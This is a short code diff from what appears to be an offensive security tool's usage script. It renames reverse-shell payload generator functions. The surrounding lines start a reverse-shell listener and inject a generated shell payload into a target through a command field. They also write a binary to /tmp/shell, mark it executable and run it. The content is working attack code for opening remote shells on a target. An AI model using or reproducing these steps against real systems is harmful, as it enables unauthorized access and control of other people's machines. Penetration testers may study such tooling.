@@ -104,7 +104,7 @@ listener = ReverseListener(ip, port, once=True, cmd_cb=lambda: 'whoami')
 
 listener.start()
 
-payload = Generator.shell(lhost=ip, lport=port, s='sh')
+payload = Generator.shell_reverse_shell(lhost=ip, lport=port, s='sh')
 print('injecting payload:', payload)
 
 res = monkey.inject_fetch({ 'command': payload })
@@ -125,7 +125,7 @@ listener = ReverseListener(ip, port, once=True, cmd_cb=lambda: 'whoami')
 
 listener.start()
 
-payload = Generator.bin(lhost=ip, lport=port, lang='c')
+payload = Generator.bin_reverse_shell(lhost=ip, lport=port)
 assert payload is not None
 
 cmd = f'printf "{payload}" > /tmp/shell && chmod +x /tmp/shell && /tmp/shell'
